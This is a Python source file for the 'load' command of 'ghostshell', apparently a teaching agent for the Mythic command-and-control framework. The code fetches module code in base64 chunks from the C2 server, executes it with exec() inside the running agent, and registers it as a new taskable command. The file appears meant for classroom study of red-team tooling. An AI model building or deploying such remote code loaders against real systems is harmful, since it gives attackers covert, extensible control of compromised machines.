"""ghostshell `load` command (agent-side).

The teaching centerpiece: fetch a command's agent code from Mythic, exec it
into the agent namespace, register it, and notify Mythic the command is now
available. After `load <cmd>`, the command reappears in `help` and is taskable.

How it works (read this in class):
  1. The operator tasks `load <module>` from the Mythic UI. Mythic stages the
     module's agent code as a chunked file and sends the `file_id` + `module`
     name in the task parameters.
  2. This command downloads the file in chunks (postMessageAndRetrieveResponse
     with an `upload` envelope, Mythic replies with chunk_data + total_chunks).
  3. The downloaded code is a top-level `def <module>(self, task_id, **params)`
     -- we exec it into this script's globals(), then register the function in
     self.loaded_commands.
  4. We tell Mythic "add" the command so the UI shows it as taskable + it
     appears in the callback's `help`.

This is the same dynamic-loading pattern Medusa uses; ghostshell keeps it
readable so a student can follow every step.
"""

import base64


def load(self, task_id, **params):
    """Load a command module into the running agent."""
    module = params.get("module") or params.get("command")
    file_id = params.get("file_id")

    if [t for t in self.taskings if t["task_id"] == task_id][0]["stopped"]:
        return "Job stopped."
    if not module:
        return "load error: no module specified"
    if not file_id:
        return "load error: no file_id (Mythic stages the code on tasking)"

    # 1. Download the command's agent code in chunks.
    code = _download_file(self, file_id)
    if not code:
        return "Failed to download '{}' command code".format(module)

    # 2. exec the top-level def into this module's globals + register it.
    try:
        exec(compile(code, "<loaded:" + module + ">", "exec"), globals())
        fn = globals().get(module)
        if not callable(fn):
            return "Loaded code did not define a callable '{}'".format(module)
        self.loaded_commands[module] = fn
    except Exception as e:
        return "load error executing '{}': {}".format(module, e)

    # 3. Tell Mythic the command is now available (add to the callback's set).
    self._notify_mythic_command("add", module)
    return "Loaded command: {}".format(module)


def _download_file(self, file_id):
    """Chunked download of a Mythic-staged file. Returns the decoded bytes."""
    code = b""
    chunk_num, total_chunks = 1, 1
    while chunk_num <= total_chunks:
        try:
            resp = self.postMessageAndRetrieveResponse({
                "action": "post_response",
                "responses": [{
                    "task_id": None,
                    "upload": {"chunk_size": 51200, "file_id": file_id, "chunk_num": chunk_num},
                }],
            })
            r = (resp.get("responses", [{}]) or [{}])[0] if isinstance(resp, dict) else {}
            total_chunks = int(r.get("total_chunks", 1))
            chunk = r.get("chunk_data", "")
            if chunk:
                code += base64.b64decode(chunk)
        except Exception:
            break
        chunk_num += 1
    return code
